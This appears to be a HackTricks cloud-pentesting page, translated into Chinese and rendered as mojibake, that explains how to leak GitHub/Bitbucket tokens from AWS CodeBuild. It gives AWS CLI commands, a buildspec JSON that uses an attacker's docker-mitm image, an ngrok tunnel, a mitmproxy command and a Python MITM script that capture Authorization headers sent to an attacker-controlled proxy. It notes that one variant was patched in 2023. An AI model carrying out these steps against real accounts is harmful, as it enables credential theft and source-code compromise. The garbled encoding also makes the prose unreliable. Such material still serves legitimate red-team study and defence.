# AWS Codebuild - ä»¤ç‰Œæ³„éœ²

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## æ¢å¤Github/Bitbucketé…ç½®çš„ä»¤ç‰Œ

é¦–å…ˆï¼Œæ£€æŸ¥æ˜¯å¦é…ç½®äº†æ‚¨å¯èƒ½æ³„éœ²çš„æºå‡­è¯ï¼š
```bash
aws codebuild list-source-credentials
```
### é€šè¿‡ Docker é•œåƒ

å¦‚æœæ‚¨å‘ç°ä¾‹å¦‚ Github çš„è®¤è¯è®¾ç½®åœ¨è´¦æˆ·ä¸­ï¼Œæ‚¨å¯ä»¥é€šè¿‡è®© Codebuild **ä½¿ç”¨ç‰¹å®šçš„ Docker é•œåƒ** æ¥è¿è¡Œé¡¹ç›®çš„æ„å»ºï¼Œæ¥**çªƒå–**é‚£äº›**è®¿é—®**ï¼ˆ**GH ä»¤ç‰Œæˆ– OAuth ä»¤ç‰Œ**ï¼‰ã€‚

ä¸ºæ­¤ï¼Œæ‚¨å¯ä»¥**åˆ›å»ºä¸€ä¸ªæ–°çš„ Codebuild é¡¹ç›®**æˆ–æ›´æ”¹ç°æœ‰é¡¹ç›®çš„**ç¯å¢ƒ**ï¼Œä»¥è®¾ç½®**Docker é•œåƒ**ã€‚

æ‚¨å¯ä»¥ä½¿ç”¨çš„ Docker é•œåƒæ˜¯ [https://github.com/carlospolop/docker-mitm](https://github.com/carlospolop/docker-mitm)ã€‚è¿™æ˜¯ä¸€ä¸ªéå¸¸åŸºç¡€çš„ Docker é•œåƒï¼Œå®ƒå°†è®¾ç½®**ç¯å¢ƒå˜é‡ `https_proxy`**ã€**`http_proxy`** å’Œ **`SSL_CERT_FILE`**ã€‚è¿™å°†å…è®¸æ‚¨æ‹¦æˆªåœ¨ **`https_proxy`** å’Œ **`http_proxy`** ä¸­æŒ‡ç¤ºçš„ä¸»æœºçš„å¤§éƒ¨åˆ†æµé‡ï¼Œå¹¶ä¿¡ä»»åœ¨ **`SSL_CERT_FILE`** ä¸­æŒ‡ç¤ºçš„ SSL è¯ä¹¦ã€‚

1. **åˆ›å»ºå¹¶ä¸Šä¼ æ‚¨è‡ªå·±çš„ Docker MitM é•œåƒ**
* æŒ‰ç…§ä»“åº“çš„è¯´æ˜è®¾ç½®æ‚¨çš„ä»£ç† IP åœ°å€å’Œ SSL è¯ä¹¦ï¼Œå¹¶**æ„å»º Docker é•œåƒ**ã€‚
* **ä¸è¦è®¾ç½® `http_proxy`**ï¼Œä»¥å…æ‹¦æˆªå¯¹å…ƒæ•°æ®ç«¯ç‚¹çš„è¯·æ±‚ã€‚
* æ‚¨å¯ä»¥ä½¿ç”¨ **`ngrok`**ï¼Œæ¯”å¦‚ `ngrok tcp 4444` æ¥è®¾ç½®ä»£ç†åˆ°æ‚¨çš„ä¸»æœº
* ä¸€æ—¦æ‚¨æ„å»ºäº† Docker é•œåƒï¼Œ**ä¸Šä¼ å®ƒåˆ°ä¸€ä¸ªå…¬å…±ä»“åº“**ï¼ˆDockerhubã€ECR...ï¼‰
2. **è®¾ç½®ç¯å¢ƒ**
* åˆ›å»ºä¸€ä¸ª**æ–°çš„ Codebuild é¡¹ç›®**æˆ–**ä¿®æ”¹**ç°æœ‰é¡¹ç›®çš„ç¯å¢ƒã€‚
* å°†é¡¹ç›®è®¾ç½®ä¸ºä½¿ç”¨**ä¹‹å‰ç”Ÿæˆçš„ Docker é•œåƒ**

<figure><img src="../../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

3. **åœ¨æ‚¨çš„ä¸»æœºä¸­è®¾ç½® MitM ä»£ç†**

* å¦‚**Github ä»“åº“**ä¸­æ‰€ç¤ºï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ç±»ä¼¼çš„ä¸œè¥¿ï¼š
```bash
mitmproxy --listen-port 4444  --allow-hosts "github.com"
```
{% hint style="success" %}
**ä½¿ç”¨çš„ mitmproxy ç‰ˆæœ¬æ˜¯ 9.0.1**ï¼Œæœ‰æŠ¥å‘Šç§°ç‰ˆæœ¬ 10 å¯èƒ½æ— æ³•å·¥ä½œã€‚
{% endhint %}

4. **è¿è¡Œæ„å»ºå¹¶æ•è·å‡­è¯**

*   ä½ å¯ä»¥åœ¨ **Authorization** å¤´ä¸­çœ‹åˆ°ä»¤ç‰Œï¼š

<figure><img src="../../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

è¿™ä¹Ÿå¯ä»¥é€šè¿‡ aws cli æ¥å®Œæˆï¼Œç±»ä¼¼äº

{% code overflow="wrap" %}
```bash
# Create project using a Github connection
aws codebuild create-project --cli-input-json file:///tmp/buildspec.json

## With /tmp/buildspec.json
{
"name": "my-demo-project",
"source": {
"type": "GITHUB",
"location": "https://github.com/uname/repo",
"buildspec": "buildspec.yml"
},
"artifacts": {
"type": "NO_ARTIFACTS"
},
"environment": {
"type": "LINUX_CONTAINER", // Use "ARM_CONTAINER" to run docker-mitm ARM
"image": "docker.io/carlospolop/docker-mitm:v12",
"computeType": "BUILD_GENERAL1_SMALL",
"imagePullCredentialsType": "CODEBUILD"
}
}

## Json

# Start the build
aws codebuild start-build --project-name my-project2
```
{% endcode %}

### ~~é€šè¿‡ HTTP åè®®~~

{% hint style="success" %}
**è¿™ä¸ªæ¼æ´åœ¨ 2023 å¹´ 2 æœˆ 20 æ—¥é‚£å‘¨çš„æŸä¸ªæ—¶å€™è¢« AWS ä¿®å¤äº†ï¼ˆæˆ‘è®¤ä¸ºæ˜¯åœ¨å‘¨äº”ï¼‰ã€‚æ‰€ä»¥æ”»å‡»è€…ç°åœ¨ä¸èƒ½å†æ»¥ç”¨å®ƒäº† :)**
{% endhint %}

æ”»å‡»è€…æ‹¥æœ‰ **åœ¨ CodeBuild ä¸Šçš„æå‡æƒé™å¯ä»¥æ³„éœ²é…ç½®çš„ Github/Bitbucket ä»¤ç‰Œ**ï¼Œæˆ–è€…å¦‚æœæƒé™æ˜¯é€šè¿‡ OAuth é…ç½®çš„ï¼Œé‚£ä¹ˆå¯ä»¥æ³„éœ²ç”¨äºè®¿é—®ä»£ç çš„**ä¸´æ—¶ OAuth ä»¤ç‰Œ**ã€‚

* æ”»å‡»è€…å¯ä»¥å‘ CodeBuild é¡¹ç›®æ·»åŠ ç¯å¢ƒå˜é‡ **http\_proxy** å’Œ **https\_proxy**ï¼ŒæŒ‡å‘ä»–çš„æœºå™¨ï¼ˆä¾‹å¦‚ `http://5.tcp.eu.ngrok.io:14972`ï¼‰ã€‚

<figure><img src="../../../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* ç„¶åï¼Œå°† github ä»“åº“çš„ URL ä» HTTPS æ”¹ä¸º HTTPï¼Œä¾‹å¦‚ï¼š**http://**github.com/carlospolop-forks/TestActions
* æ¥ç€ï¼Œåœ¨ä»£ç†å˜é‡ï¼ˆhttp\_proxy å’Œ https\_proxyï¼‰æŒ‡å‘çš„ç«¯å£ä¸Šè¿è¡Œ [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) ä¸­çš„åŸºæœ¬ç¤ºä¾‹
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
* æœ€åï¼Œç‚¹å‡» **æ„å»ºé¡¹ç›®**ï¼Œ**å‡­è¯**å°†ä»¥æ˜æ–‡ï¼ˆbase64ï¼‰å½¢å¼å‘é€åˆ°mitmç«¯å£ï¼š

<figure><img src="../../../../.gitbook/assets/image (1) (1) (6).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
ç°åœ¨ï¼Œæ”»å‡»è€…å°†èƒ½å¤Ÿä»ä»–çš„æœºå™¨ä¸Šä½¿ç”¨è¯¥ä»¤ç‰Œï¼Œåˆ—å‡ºå®ƒæ‹¥æœ‰çš„æ‰€æœ‰æƒé™ï¼Œå¹¶ä¸”æ¯”ç›´æ¥ä½¿ç”¨CodeBuildæœåŠ¡æ›´å®¹æ˜“ï¼ˆæ»¥ï¼‰ç”¨ã€‚
{% endhint %}

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹ AWSé»‘å®¢æ”»å‡»ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä»¥PDFæ ¼å¼ä¸‹è½½HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹çš„PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
